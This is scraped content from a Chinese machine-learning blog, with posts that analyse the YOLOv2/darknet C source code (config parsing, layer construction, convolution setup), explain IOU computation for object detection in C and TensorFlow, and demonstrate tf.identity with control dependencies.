123typedef enum &#123; CONSTANT, STEP, EXP, POLY, STEPS, SIG, RANDOM&#125; learning_rate_policy; 这是在前面就提到的。我们现在来看看，这几个有什么区别（参考caffe源码） CONSTANT:学习率是一个固定的值learning_rate STEP:是一种均匀分步策略learning_rate* gamma ^ (floor(iter / step)) EXP:learning_rate* gamma ^ iter POLY:learning_rate(1 - iter/max_iter) ^ (power) STEPS:同STEP只是这里的scale和step是一个数组 SIG:learning_rate ( 1/(1 + exp(-gamma * (iter - stepsize)))) RANDOM:代码中没有考虑 回头看整个parse_net_options这个函数，这个函数的主要功能就是读取[net]后的信息，赋值到net所指向的network结构中。 接着我们再回到parse_network_cfg 12345678910111213//parse_network_cfg params.h = net-&gt;h; //将h，w，c赋值size_params对象params，下面类似不再赘述 params.w = net-&gt;w; params.c = net-&gt;c; params.inputs = net-&gt;inputs; params.batch = net-&gt;batch; params.time_steps = net-&gt;time_steps; params.net = net; size_t workspace_size = 0; n = n-&gt;next; //[net]搞定了，接下来去下一个node int count = 0; free_section(s); 我们再来看看这个free_section函数做了什么 123456789101112131415void free_section(section *s)//传入的变量是之前的那个section指针&#123; free(s-&gt;type);//释放type空间 node *n = s-&gt;options-&gt;front;//以下内容是释放s指向的kvp链表 while(n)&#123; kvp *pair = (kvp *)n-&gt;val; free(pair-&gt;key); free(pair); node *next = n-&gt;next; free(n); n = next; &#125; free(s-&gt;options); free(s);//最后释放s&#125; 综上来看这个函数的目的在这里很明显了。我们把cfg的参数从section中copy到了network中，section内存不用了，自然要把它释放。 再回到parse_network_cfg函数 123456789//parse_network_cfg fprintf(stderr, \"layer filters size input output\\n\"); while(n)&#123; params.index = count; fprintf(stderr, \"%5d \", count); s = (section *)n-&gt;val; options = s-&gt;options; layer l = &#123;0&#125;; LAYER_TYPE lt = string_to_layer_type(s-&gt;type); 这是一个非常大的循环体，先看前面一小部分。我们先看看其中的LAYER_TYPE结构和layer结构 12345678910111213141516171819202122232425262728293031323334353637383940414243//现在这个结构也放在了darknet.h中struct layer;typedef struct layer layer;typedef enum &#123; CONVOLUTIONAL, DECONVOLUTIONAL, CONNECTED, MAXPOOL, SOFTMAX, DETECTION, DROPOUT, CROP, ROUTE, COST, NORMALIZATION, AVGPOOL, LOCAL, SHORTCUT, ACTIVE, RNN, GRU, LSTM, CRNN, BATCHNORM, NETWORK, XNOR, REGION, REORG, BLANK&#125; LAYER_TYPE;struct layer&#123; LAYER_TYPE type; ACTIVATION activation; COST_TYPE cost_type; void (*forward) (struct layer, struct network); void (*backward) (struct layer, struct network); void (*update) (struct layer, update_args); void (*forward_gpu) (struct layer, struct network); void (*backward_gpu) (struct layer, struct network); void (*update_gpu) (struct layer, update_args); ... 我们可以看到LAYER_TYPE就是每一层的类型。而layer就是设置这些层的参数，由于参数太多，我在后面会分开讲。 再来看string_to_layer_type函数 123456789101112131415161718192021222324252627282930313233343536LAYER_TYPE string_to_layer_type(char * type)//传入的参数就是之前的section-&gt;type&#123; if (strcmp(type, \"[shortcut]\")==0) return SHORTCUT; if (strcmp(type, \"[crop]\")==0) return CROP; if (strcmp(type, \"[cost]\")==0) return COST; if (strcmp(type, \"[detection]\")==0) return DETECTION; if (strcmp(type, \"[region]\")==0) return REGION; if (strcmp(type, \"[local]\")==0) return LOCAL; if (strcmp(type, \"[conv]\")==0 || strcmp(type, \"[convolutional]\")==0) return CONVOLUTIONAL; if (strcmp(type, \"[deconv]\")==0 || strcmp(type, \"[deconvolutional]\")==0) return DECONVOLUTIONAL; if (strcmp(type, \"[activation]\")==0) return ACTIVE; if (strcmp(type, \"[net]\")==0 || strcmp(type, \"[network]\")==0) return NETWORK; if (strcmp(type, \"[crnn]\")==0) return CRNN; if (strcmp(type, \"[gru]\")==0) return GRU; if (strcmp(type, \"[lstm]\") == 0) return LSTM; if (strcmp(type, \"[rnn]\")==0) return RNN; if (strcmp(type, \"[conn]\")==0 || strcmp(type, \"[connected]\")==0) return CONNECTED; if (strcmp(type, \"[max]\")==0 || strcmp(type, \"[maxpool]\")==0) return MAXPOOL; if (strcmp(type, \"[reorg]\")==0) return REORG; if (strcmp(type, \"[avg]\")==0 || strcmp(type, \"[avgpool]\")==0) return AVGPOOL; if (strcmp(type, \"[dropout]\")==0) return DROPOUT; if (strcmp(type, \"[lrn]\")==0 || strcmp(type, \"[normalization]\")==0) return NORMALIZATION; if (strcmp(type, \"[batchnorm]\")==0) return BATCHNORM; if (strcmp(type, \"[soft]\")==0 || strcmp(type, \"[softmax]\")==0) return SOFTMAX; if (strcmp(type, \"[route]\")==0) return ROUTE; return BLANK;&#125; 这个函数的作用很明显，通过比较字符串，将原先的section中的type变成了LAYER_TYPE中的枚举元素。 接着回到parse_network_cfg，后面就是很多的条件判断 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 //parse_network_cfg if(lt == CONVOLUTIONAL)&#123; l = parse_convolutional(options, params); &#125;else if(lt == DECONVOLUTIONAL)&#123; l = parse_deconvolutional(options, params); &#125;else if(lt == LOCAL)&#123; l = parse_local(options, params); &#125;else if(lt == ACTIVE)&#123; l = parse_activation(options, params); &#125;else if(lt == RNN)&#123; l = parse_rnn(options, params); &#125;else if(lt == GRU)&#123; l = parse_gru(options, params); &#125;else if (lt == LSTM) &#123; l = parse_lstm(options, params); &#125;else if(lt == CRNN)&#123; l = parse_crnn(options, params); &#125;else if(lt == CONNECTED)&#123; l = parse_connected(options, params); &#125;else if(lt == CROP)&#123; l = parse_crop(options, params); &#125;else if(lt == COST)&#123; l = parse_cost(options, params); &#125;else if(lt == REGION)&#123; l = parse_region(options, params); &#125;else if(lt == DETECTION)&#123; l = parse_detection(options, params); &#125;else if(lt == SOFTMAX)&#123; l = parse_softmax(options, params); net-&gt;hierarchy = l.softmax_tree; &#125;else if(lt == NORMALIZATION)&#123; l = parse_normalization(options, params); &#125;else if(lt == BATCHNORM)&#123; l = parse_batchnorm(options, params); &#125;else if(lt == MAXPOOL)&#123; l = parse_maxpool(options, params); &#125;else if(lt == REORG)&#123; l = parse_reorg(options, params); &#125;else if(lt == AVGPOOL)&#123; l = parse_avgpool(options, params); &#125;else if(lt == ROUTE)&#123; l = parse_route(options, params, net); &#125;else if(lt == SHORTCUT)&#123; l = parse_shortcut(options, params, net); &#125;else if(lt == DROPOUT)&#123; l = parse_dropout(options, params); l.output = net-&gt;layers[count-1].output; l.delta = net-&gt;layers[count-1].delta;#ifdef GPU l.output_gpu = net-&gt;layers[count-1].output_gpu; l.delta_gpu = net-&gt;layers[count-1].delta_gpu;#endif &#125; 然后再看以parse开头的函数作用，以其中一个为例parse_convolutional 0x0103 parse_convolutional1234567891011121314151617181920212223242526272829convolutional_layer parse_convolutional(list *options, size_params params)&#123; int n = option_find_int(options, \"filters\",1); //卷积核个数 int size = option_find_int(options, \"size\",1); //卷积核大小 int stride = option_find_int(options, \"stride\",1);//步长 int pad = option_find_int_quiet(options, \"pad\",0);//图像周围是否补0 int padding = option_find_int_quiet(options, \"padding\",0);//补0的长度 int groups = option_find_int_quiet(options, \"groups\", 1);//卷积核组的个数 if(pad) padding = size/2;//对应SAME补0策略 char *activation_s = option_find_str(options, \"activation\", \"logistic\");//激活函数 ACTIVATION activation = get_activation(activation_s); int batch,h,w,c; h = params.h; //图片的高 w = params.w; //图片的宽 c = params.c; //图片的通道数 batch=params.batch; if(!(h &amp;&amp; w &amp;&amp; c)) error(\"Layer before convolutional layer must output image.\"); int batch_normalize = option_find_int_quiet(options, \"batch_normalize\", 0);//BN操作 int binary = option_find_int_quiet(options, \"binary\", 0);//权重二值化 int xnor = option_find_int_quiet(options, \"xnor\", 0);//权重和输入二值化 convolutional_layer layer = make_convolutional_layer(batch,h,w,c,n,groups,size,stride,padding,activation, batch_normalize, binary, xnor, params.net-&gt;adam); layer.flipped = option_find_int_quiet(options, \"flipped\", 0); layer.dot = option_find_float_quiet(options, \"dot\", 0); return layer;&#125; 因为我之前已经讲过了option_find_int函数，所以这里不再多说了。代码的前面部分也非常容易理解，就射设置，不同[]后面的参数。 后面又出现一个新的结构ACTIVATION 123typedef enum&#123; LOGISTIC, RELU, RELIE, LINEAR, RAMP, TANH, PLSE, LEAKY, ELU, LOGGY, STAIR, HARDTAN, LHTAN&#125; ACTIVATION; 很明显这个枚举是用来定义不同的激活函数的。 再看get_activation这个函数 123456789101112131415161718ACTIVATION get_activation(char *s)//传入的参数时cfg中的activation&#123; if (strcmp(s, \"logistic\")==0) return LOGISTIC; if (strcmp(s, \"loggy\")==0) return LOGGY; if (strcmp(s, \"relu\")==0) return RELU; if (strcmp(s, \"elu\")==0) return ELU; if (strcmp(s, \"relie\")==0) return RELIE; if (strcmp(s, \"plse\")==0) return PLSE; if (strcmp(s, \"hardtan\")==0) return HARDTAN; if (strcmp(s, \"lhtan\")==0) return LHTAN; if (strcmp(s, \"linear\")==0) return LINEAR; if (strcmp(s, \"ramp\")==0) return RAMP; if (strcmp(s, \"leaky\")==0) return LEAKY; if (strcmp(s, \"tanh\")==0) return TANH; if (strcmp(s, \"stair\")==0) return STAIR; fprintf(stderr, \"Couldn't find activation function %s, going with ReLU\\n\", s); return RELU;&#125; 这个函数的作用也很明显，通过比较字符串，将原先的激活函数的字符串，转化为现在的ACTIVATION枚举元素。 接着看convolutional_layer这个结构 1typedef layer convolutional_layer; 其实就是一个layer，再看make_convolutional_layer函数（又是一个非常大的函数） 1234567891011121314151617181920212223242526272829303132333435convolutional_layer make_convolutional_layer(int batch, int h, int w, int c, int n, int groups, int size, int stride, int padding, ACTIVATION activation, int batch_normalize, int binary, int xnor, int adam)//传入的参数就是我们之前设置好的&#123; int i; convolutional_layer l = &#123;0&#125;; l.type = CONVOLUTIONAL; l.groups = groups; //卷积核的组数 l.h = h; //图像的高 l.w = w; //图像的宽 l.c = c; //图像的通道数目 l.n = n; //卷积核个数 l.binary = binary; l.xnor = xnor; l.batch = batch; l.stride = stride; l.size = size; l.pad = padding; l.batch_normalize = batch_normalize; l.weights = calloc(c/groups*n*size*size, sizeof(float));//计算所有权重个数，c/groups*n*size*size，分配内存空间 l.weight_updates = calloc(c/groups*n*size*size, sizeof(float)); l.biases = calloc(n, sizeof(float));//卷积核个数和偏向的数目一致，分配内存空间 l.bias_updates = calloc(n, sizeof(float)); l.nweights = c/groups*n*size*size; l.nbiases = n; // float scale = 1./sqrt(size*size*c); float scale = sqrt(2./(size*size*c/l.groups));//缩放系数 //scale = .02; //for(i = 0; i &lt; c*n*size*size; ++i) l.weights[i] = scale*rand_uniform(-1, 1); for(i = 0; i &lt; l.nweights; ++i) l.weights[i] = scale*rand_normal();//初始化权重 int out_w = convolutional_out_width(l); int out_h = convolutional_out_height(l); 这里出现了新的函数，我们只分析其中一个convolutional_out_width 12345678int convolutional_out_height(convolutional_layer l)&#123; return (l.h + 2*l.pad - l.size) / l.stride + 1;&#125;int convolutional_out_width(convolutional_layer l)&#123; return (l.w + 2*l.pad - l.size) / l.stride + 1;&#125; 函数中这个公式大家应该很熟悉，就是计算卷积后的输出图像的大小。 接着看make_convolutional_layer这个函数后面的部分 123456789//make_convolutional_layer l.out_h = out_h; //输出图像的高 l.out_w = out_w; //输出图像的宽 l.out_c = n; //输出图像的通道数 l.outputs = l.out_h * l.out_w * l.out_c;//输出图像的总元素个数 l.inputs = l.w * l.h * l.c; //输入图像的总元素个数 l.output = calloc(l.batch*l.outputs, sizeof(float)); l.delta = calloc(l.batch*l.outputs, sizeof(float)); 好的，这篇文章的篇幅有些长了，我们把剩余部分放到下一篇 文章全部YOLOv2源码分析 由于本人水平有限，文中有不对之处，希望大家指出，谢谢^_^! 下一篇继续分析make_convolutional_layer这个函数后面的部分，敬请关注。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"YOLOv2代码分析（一）","slug":"2017-12-16-YOLOv2代码分析（一）","date":"2017-12-15T16:00:00.000Z","updated":"2018-02-18T08:37:08.168Z","comments":true,"path":"2017/12/16/2017-12-16-YOLOv2代码分析（一）/","link":"","permalink":"http://coordinate.wang/2017/12/16/2017-12-16-YOLOv2代码分析（一）/","excerpt":"0x00 写在开头写这一系列文章主要是想解析yolov2的具体实现，因为在作者的论文中有很多地方没有进行详细表述，所以不看源代码的话很难知道幕后具体做了什么。另一点是学习一下别人的思路，因为你要知道作者的代码相当于自己写了一个小型框架（函数的接口设计的可能不是非常好）。 0x01 从main函数开始12345678910int main(int argc, char **argv)&#123; //test_resize(\"data/bad.jpg\"); //test_box(); //test_convolutional_layer(); if(argc &lt; 2)&#123; fprintf(stderr, \"usage: %s &lt;function&gt;\\n\", argv[0]);//如果参数小于2就打印出错信息 return 0;//出错后返回 &#125; gpu_index = find_int_arg(argc, argv, \"-i\", 0);","text":"0x00 写在开头写这一系列文章主要是想解析yolov2的具体实现，因为在作者的论文中有很多地方没有进行详细表述，所以不看源代码的话很难知道幕后具体做了什么。另一点是学习一下别人的思路，因为你要知道作者的代码相当于自己写了一个小型框架（函数的接口设计的可能不是非常好）。 0x01 从main函数开始12345678910int main(int argc, char **argv)&#123; //test_resize(\"data/bad.jpg\"); //test_box(); //test_convolutional_layer(); if(argc &lt; 2)&#123; fprintf(stderr, \"usage: %s &lt;function&gt;\\n\", argv[0]);//如果参数小于2就打印出错信息 return 0;//出错后返回 &#125; gpu_index = find_int_arg(argc, argv, \"-i\", 0); 接着看到find_int_arg函数 1234567891011121314int find_int_arg(int argc, char **argv, char *arg, int def)&#123; int i; for(i = 0; i &lt; argc-1; ++i)&#123; if(!argv[i]) continue; if(0==strcmp(argv[i], arg))&#123; def = atoi(argv[i+1]); del_arg(argc, argv, i); del_arg(argc, argv, i); break; &#125; &#125; return def;&#125; find_int_arg这个函数本身的目的是要找出参数中的int值。在这里主要任务就是判断输入参数是不是有-i，将-i后一位的数值转化为int，然后返回这个值。其中又出现了两次del_arg函数 123456void del_arg(int argc, char **argv, int index)&#123; int i; for(i = index; i &lt; argc-1; ++i) argv[i] = argv[i+1]; argv[i] = 0;&#125; 这个函数作用是删除index位置的参数。此处调用两次的作用是将-i和其后的数值去除，类似于一个列表前移操作，后面的项补0。 接着看main函数后面的 123if(find_arg(argc, argv, \"-nogpu\")) &#123; gpu_index = -1; &#125; 这里调用了一个find_arg函数 123456789101112int find_arg(int argc, char* argv[], char *arg)&#123; int i; for(i = 0; i &lt; argc; ++i) &#123; if(!argv[i]) continue; if(0==strcmp(argv[i], arg)) &#123; del_arg(argc, argv, i); return 1; &#125; &#125; return 0;&#125; 这个函数的作用就是查看参数中是否有arg指向的字符串。在这里如果参数中出现了-nogpu则我们gpu_index设置为-1，也就是不使用gpu 接着往后 1234567#ifndef GPU gpu_index = -1;#else if(gpu_index &gt;= 0)&#123; cuda_set_device(gpu_index); &#125;#endif 如果没有定义GPU这个宏，那么将 gpu_index设置为 -1。如果设置了，并且我们前面也没有关闭gpu选项的话，那么调用cuda_set_device这个函数 123456void cuda_set_device(int n)&#123; gpu_index = n; cudaError_t status = cudaSetDevice(n);//这是cuda编程里面的，不详细说。设置显卡编号 check_error(status);//判断返回信息，设置显卡成功了，还是失败了&#125; 接着往后 123else if (0 == strcmp(argv[1], \"yolo\"))&#123; run_yolo(argc, argv); &#125; 这里有很多选项，我先看我最感兴趣的yolo选项 到这里main函数中的所有问题就理清楚了，接着就是run_yolo函数中问题了 0x02 run_yolo12345678910111213141516171819202122void run_yolo(int argc, char **argv)&#123; char *prefix = find_char_arg(argc, argv, \"-prefix\", 0); float thresh = find_float_arg(argc, argv, \"-thresh\", .2); int cam_index = find_int_arg(argc, argv, \"-c\", 0); int frame_skip = find_int_arg(argc, argv, \"-s\", 0); if(argc &lt; 4)&#123;//如果参数小于4，打印出错信息 fprintf(stderr, \"usage: %s %s [train/test/valid] [cfg] [weights (optional)]\\n\", argv[0], argv[1]); return; &#125; int avg = find_int_arg(argc, argv, \"-avg\", 1); char *cfg = argv[3]; char *weights = (argc &gt; 4) ? argv[4] : 0; char *filename = (argc &gt; 5) ? argv[5]: 0; //根据第三个参数选择调用的函数 if(0==strcmp(argv[2], \"test\")) test_yolo(cfg, weights, filename, thresh); else if(0==strcmp(argv[2], \"train\")) train_yolo(cfg, weights); else if(0==strcmp(argv[2], \"valid\")) validate_yolo(cfg, weights); else if(0==strcmp(argv[2], \"recall\")) validate_yolo_recall(cfg, weights); else if(0==strcmp(argv[2], \"demo\")) demo(cfg, weights, thresh, cam_index, filename, voc_names, 20, frame_skip, prefix, avg, .5, 0,0,0,0);&#125; 这里有find_char_arg，find_float_arg函数，这里就不再赘述了，按照前面解析find_int_arg的思路去做。 首先cfg这个指针指向cfg文件名字符串，weight指向了权重文件名字符串。别的变量暂时不管，因为我们先关注train_yolo这个函数。 1234567void train_yolo(char *cfgfile, char *weightfile)&#123; char *train_images = \"/data/voc/train.txt\";//train_images指向train.txt路径字符串 char *backup_directory = \"/home/pjreddie/backup/\";//backup_directory指向保存权重文件的路径 srand(time(0));//设置随机数种子 char *base = basecfg(cfgfile);//cfgfile就是上面说的cfg指向的字符串 printf(\"%s\\n\", base); 好的，这里出现了一个basecfg函数 12345678910111213141516171819char *basecfg(char *cfgfile)&#123; char *c = cfgfile; char *next; while((next = strchr(c, '/'))) &#123; c = next+1; &#125; c = copy_string(c); next = strchr(c, '.'); if (next) *next = 0; return c;&#125;char *copy_string(char *s)&#123; char *copy = malloc(strlen(s)+1); strncpy(copy, s, strlen(s)+1); return copy;&#125; 先看传入的参数cfgfile，是一个cfg文件的路径字符串。接着strchr，这个函数的作用是去第一个参数中，第二个参数以后的字符包括第二个参数（abc/ab.cfg—&gt;/ab.cfg），接着c=next+1，也就是c指向了这个cfg文件名字符串。 copy_string函数的作用，就是重新分配一块内存，并且内容保留。那这里next后的操作就很清楚了，就是把.cfg后缀去掉。 这个函数是有缺陷的，因为这里没有考虑到window用户的需求，应该增加\\\\的处理。 接着回到train_yolo函数 123//train_yolo float avg_loss = -1; network net = parse_network_cfg(cfgfile); 这里出现了parse_network_cfg函数 0x03 parse_network_cfg123network *parse_network_cfg(char *filename)&#123; list *sections = read_cfg(filename); 出现了一个read_cfg函数 0x0301 read_cfg1234list *read_cfg(char *filename)&#123; FILE *file = fopen(filename, \"r\"); if(file == 0) file_error(filename); 12345void file_error(char *s)&#123; fprintf(stderr, \"Couldn't open file: %s\\n\", s); exit(0);&#125; file_error判断cfg文件有没有打开失败。接着往后 123456//read_cfg char *line; int nu = 0; list *options = make_list();//创建一个链表 section *current = 0; while((line=fgetl(file)) != 0)&#123; 这里出现了一个fgetl函数 123456789101112131415161718192021222324252627282930313233343536char *fgetl(FILE *fp)//fp指向打开后的cfg文件&#123; if(feof(fp)) return 0;//如果文件结尾，退出 size_t size = 512; char *line = malloc(size*sizeof(char));//分配512字节内存 //从fp中读取一行数据到line中，数据最大为size。 //注意，如果碰到换行或文件eof会停止读入。读取失败返回NULL if(!fgets(line, size, fp))&#123; free(line);//失败就释放内存 return 0; &#125; size_t curr = strlen(line);//返回line的长度，也就是读入的字符个数 //这里的代码是为了处理size不够的情况 while((line[curr-1] != '\\n') &amp;&amp; !feof(fp))&#123; if(curr == size-1)&#123; //size不够我们就变大两倍 size *= 2; line = realloc(line, size*sizeof(char)); if(!line) &#123; printf(\"%ld\\n\", size); malloc_error(); &#125; &#125; //line不够，也就是一行没有读全，那么不会再从开始，而是接着上一次没有读完的信息 size_t readsize = size-curr; if(readsize &gt; INT_MAX) readsize = INT_MAX-1; fgets(&amp;line[curr], readsize, fp); curr = strlen(line); &#125; if(line[curr-1] == '\\n') line[curr-1] = '\\0'; return line;&#125; 这个函数的作用，简单理解就是读取文件的一行。其实用c++中的getline函数就可以解决了。同样的python中的readline也可以做到。 接着回到read_cfg函数 123//read_cfg ++ nu; strip(line); 出现一个strip函数 12345678910111213void strip(char *s)//传入我们前面读入的行&#123; size_t i; size_t len = strlen(s); size_t offset = 0; //这里的做法和list前移一样，出现空格符，则其后的所有项前移 for(i = 0; i &lt; len; ++i)&#123; char c = s[i]; if(c==' '||c=='\\t'||c=='\\n') ++offset; else s[i-offset] = c; &#125; s[len-offset] = '\\0';&#125; 这个函数的作用就是删除字符串中的空格符（’\\n’,’\\t’,’ ‘） 回到read_cfg函数 1234567891011121314151617181920212223 switch(line[0])&#123; case '['://这里就是看读入的行的第一个字符是'['也就是对于cfg文件中[net],[maxpool]这种东西 current = malloc(sizeof(section));//创建一个current list_insert(options, current);//将current插入之前建立的options链表 current-&gt;options = make_list();//给current创建链表 current-&gt;type = line;//将读入的[net],[maxpool]读入type break; case '\\0': case '#': case ';': free(line); break; default: if(!read_option(line, current-&gt;options))&#123; fprintf(stderr, \"Config file error line %d, could parse: %s\\n\", nu, line); free(line); &#125; break; &#125; &#125; fclose(file); return options;&#125; 先看一下section这个结构体的定义 1234typedef struct&#123; char *type; list *options;&#125;section; 它的内部包含一个链表。这里作者的list_insert(options, current);中options和后面的current-&gt;options = make_list();中的options存在歧义。其实两者一毛钱关系都没有。 分析一下这个read_option函数 123456789101112131415161718192021222324252627282930int read_option(char *s, list *options)//s指向读取的行，list就是一个section中的list&#123; size_t i; size_t len = strlen(s); char *val = 0; for(i = 0; i &lt; len; ++i)&#123; if(s[i] == '=')&#123; s[i] = '\\0'; val = s+i+1;//val指向=后面的字符串 break; &#125; &#125; if(i == len-1) return 0; char *key = s;//这个时候key指向的是=前面的字符串 option_insert(options, key, val); return 1;&#125;typedef struct&#123; char *key; char *val; int used;&#125; kvp;void option_insert(list *l, char *key, char *val)&#123; kvp *p = malloc(sizeof(kvp)); p-&gt;key = key; p-&gt;val = val; p-&gt;used = 0; list_insert(l, p);//将一个kvp结构插入section中的list&#125; 回头再看这个switch，他在这里的作用就是将cfg文件中的不同内容（’[net]’,’[maxpool]’）区分开，然后存到一个列表中。 举个例子 1234567[convolutional]batch_normalize=1filters=32size=3stride=1pad=1activation=leaky 这是yolo9000.cfg中的一个片段，我们先看第一行，他是一个’[]’，所以进入第一个判断，我们首先将[convolutional]字符串，存入一个section对象的type中，并且将这个section对象插入到一个列表中。接着读取第二行batch_normalize=1，将=前后内容拆开存储到kvp结构中，再将这个kvp插入到section的list中。 总览整个read_cfg函数 12345678910111213141516171819202122232425262728293031323334list *read_cfg(char *filename)&#123; FILE *file = fopen(filename, \"r\"); if(file == 0) file_error(filename); char *line; int nu = 0; list *options = make_list(); section *current = 0; while((line=fgetl(file)) != 0)&#123; ++ nu; strip(line); switch(line[0])&#123; case '[': current = malloc(sizeof(section)); list_insert(options, current); current-&gt;options = make_list(); current-&gt;type = line; break; case '\\0': case '#': case ';': free(line); break; default: if(!read_option(line, current-&gt;options))&#123; fprintf(stderr, \"Config file error line %d, could parse: %s\\n\", nu, line); free(line); &#125; break; &#125; &#125; fclose(file); return options;&#125; 作者做了一种数据结构来存放cfg的文件数据。 文章全部YOLOv2源码分析 由于本人水平有限，文中有不对之处，希望大家指出，谢谢^_^! 下一篇继续分析parse_network_cfg这个函数后面的部分，敬请关注。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"目标检测中的IOU计算问题","slug":"2017-12-15-目标检测中的IOU计算问题","date":"2017-12-14T16:00:00.000Z","updated":"2018-02-18T08:37:23.444Z","comments":true,"path":"2017/12/15/2017-12-15-目标检测中的IOU计算问题/","link":"","permalink":"http://coordinate.wang/2017/12/15/2017-12-15-目标检测中的IOU计算问题/","excerpt":"在目标检测中我们有一个基本的操作，形象表述就是画框框，我们要通过我们画的框把我们要标注的目标给框出来，如下面那个狗。我们既可以说这个狗被框出来了，但是也可以说没有，因为你可以观察到左边和上面是存在一些缝隙的。 那问题就出现了。什么样的框才算把目标给框住了呢？这个时候就有了IOU这个评价指标。什么是IOU？ IOU想要描述的时黄框（检测到的结果）和绿框（标注的结果）重合的程度。用公式表示为 $IOU = \\frac{DetectionResult\\bigcap GroundTruth}{DetectionResult\\bigcup GroundTruth}$","text":"在目标检测中我们有一个基本的操作，形象表述就是画框框，我们要通过我们画的框把我们要标注的目标给框出来，如下面那个狗。我们既可以说这个狗被框出来了，但是也可以说没有，因为你可以观察到左边和上面是存在一些缝隙的。 那问题就出现了。什么样的框才算把目标给框住了呢？这个时候就有了IOU这个评价指标。什么是IOU？ IOU想要描述的时黄框（检测到的结果）和绿框（标注的结果）重合的程度。用公式表示为 $IOU = \\frac{DetectionResult\\bigcap GroundTruth}{DetectionResult\\bigcup GroundTruth}$ 公式里面的DetectionResult就表示黄框（也就是通过神经网络得到的结果），GroundResult表示绿框（也就是标注的结果）。 好的，这看上去很容易，但是在具体实现的时候就会有一些问题了。接下来我先用YOLO2中的做法讲解其实现原理。 123456789101112131415161718192021222324252627282930float overlap(float x1, float w1, float x2, float w2)&#123; float l1 = x1 - w1/2; float l2 = x2 - w2/2; float left = l1 &gt; l2 ? l1 : l2; float r1 = x1 + w1/2; float r2 = x2 + w2/2; float right = r1 &lt; r2 ? r1 : r2; return right - left;&#125;float box_intersection(box a, box b)&#123; float w = overlap(a.x, a.w, b.x, b.w); float h = overlap(a.y, a.h, b.y, b.h); if(w &lt; 0 || h &lt; 0) return 0; float area = w*h; return area;&#125;float box_union(box a, box b)&#123; float i = box_intersection(a, b); float u = a.w*a.h + b.w*b.h - i; return u;&#125;float box_iou(box a, box b)&#123; return box_intersection(a, b)/box_union(a, b);&#125; 在这个代码中box a表示结果box，而box b表示的是标注box，这两者都是box类的对象，这个类在这里我们用到了这样几个属性： x:表示box中心点的x坐标 y:表示box中心点的y坐标 w:表示box的宽度 h:表示box的高度 我么先看第一个函数overlap是干什么的。假设按照box_intersection中的第一个做法，传入这样几个参数overlap(a.x, a.w, b.x, b.w)，结果就是l1表示黄框的左边，l2表示绿框的左边，r1表示黄框的右边，r2表示绿框的右边。如下图 接着left=l2，right=r1，最后right-left=交集的宽。同理传入overlap(a.y, a.h, b.y, b.h) 得到交集的高。两个一乘即为交集的大小。box_iou函数中的做法大家应该可以看得明白了，不再赘述。 当我们训练好网络后，将待测图像输入网络得到的输出结果是一个高维矩阵。在YOLO2中最后得到的矩阵是这样的[-1, H, W, B, (4 + 1 + C)]。 H:表示纵向分割的块的数目 W:表示横向分割的块的数目 也就是一幅图片被我们分割为了H*W块。 B:表示anchors的数目 C:表示classes的数目 注意这里的4表示前面讲的x,y,w,h，而后面1表示confidence（参看论文中的$Pr(object)*IOU$） 以下是对应的python tensorflow版本 12345678910111213141516coords = tf.reshape(coords, [-1, H*W, B, 4])wh = tf.exp(coords[:,:,:,2:4]) * np.reshape(anchors, [1, 1, B, 2])area_pred = wh[:,:,:,0] * wh[:,:,:,1]#得到预测框的面积centers = coords[:,:,:,0:2]#得到预测框的xyfloor = centers - (wh * .5)ceil = centers + (wh * .5)# calculate the intersection areasintersect_upleft = tf.maximum(floor, _upleft)intersect_botright = tf.minimum(ceil , _botright)intersect_wh = intersect_botright - intersect_upleftintersect_wh = tf.maximum(intersect_wh, 0.0)intersect = tf.multiply(intersect_wh[:,:,:,0], intersect_wh[:,:,:,1])#得到交集# calculate the best IOU, set 0.0 confidence for worse boxesiou = tf.truediv(intersect, _areas + area_pred - intersect)#_areas表示真实的面积 这里的floor对应于上面的l1、黄框的下边，ceil对应于上面的r1、黄框的上边。_upleft对应上面的l2和绿框的下边，_botright对应上面的r2和绿框的上边。intersect_upleft就是l2和黄框的下边，intersect_botright就是r1和绿框的上边，后面的代码就顺理成章了。 由于本人水平有限，如有问题，恳请指出！^_^","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"IOU","slug":"IOU","permalink":"http://coordinate.wang/tags/IOU/"}]},{"title":"tf.identity的作用","slug":"2017-12-13-tf.identity的作用","date":"2017-12-12T16:00:00.000Z","updated":"2018-02-18T08:37:30.779Z","comments":true,"path":"2017/12/13/2017-12-13-tf.identity的作用/","link":"","permalink":"http://coordinate.wang/2017/12/13/2017-12-13-tf.identity的作用/","excerpt":"还是从一个例子开始讲起 1234567891011x = tf.Variable(0.0)x_plus_1 = tf.assign_add(x, 1)#对x进行加1操作#tf.control_dependencies的作用是:在执行y=x前，先执行x_plus_1with tf.control_dependencies([x_plus_1]): y = xinit = tf.initialize_all_variables()with tf.Session() as session: init.run() for i in xrange(5): print(y.eval())","text":"还是从一个例子开始讲起 1234567891011x = tf.Variable(0.0)x_plus_1 = tf.assign_add(x, 1)#对x进行加1操作#tf.control_dependencies的作用是:在执行y=x前，先执行x_plus_1with tf.control_dependencies([x_plus_1]): y = xinit = tf.initialize_all_variables()with tf.Session() as session: init.run() for i in xrange(5): print(y.eval()) 这个代码的输出和我们想象的不一样，他的输出是0, 0, 0, 0, 0 1234567891011x = tf.Variable(0.0)x_plus_1 = tf.assign_add(x, 1)with tf.control_dependencies([x_plus_1]): y = tf.identity(x)init = tf.initialize_all_variables()with tf.Session() as session: init.run() for i in xrange(5): print(y.eval()) 这段代码的输出才是1, 2, 3, 4, 5 